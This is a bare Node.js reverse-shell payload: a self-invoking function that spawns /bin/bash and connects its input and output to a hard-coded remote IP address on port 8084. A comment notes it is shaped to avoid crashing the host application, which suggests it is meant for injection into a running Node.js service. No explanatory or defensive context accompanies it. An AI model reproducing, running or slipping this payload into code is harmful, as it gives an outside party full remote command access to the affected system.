    (function(){
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/bash", []);
        var client = new net.Socket();
        client.connect(8084, "18.116.29.205", function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();
    
